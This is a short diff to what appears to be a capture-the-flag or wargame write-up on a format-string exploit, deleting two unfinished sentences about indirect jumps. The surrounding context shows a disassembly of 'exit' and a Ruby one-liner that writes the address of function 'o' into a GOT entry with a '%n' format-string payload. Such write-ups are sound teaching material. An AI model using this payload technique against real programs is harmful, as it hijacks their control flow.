@@ -35,9 +35,6 @@ When we disass 'exit' we can see a jmp *address that we will use for our exploit
        0x080483db <+11>:    jmp    0x8048370
     End of assembler dump.
 
-jmp *address means
-and is different from jmp address which 
-
 We will need to write the address of 'o' (0x080484a4 = 134513828) in the jmp *address (0x8049838).
 
 $ ruby -e 'print "\x38\x98\x04\x08" + "%134513824x%4\$n"' > /tmp/buffer
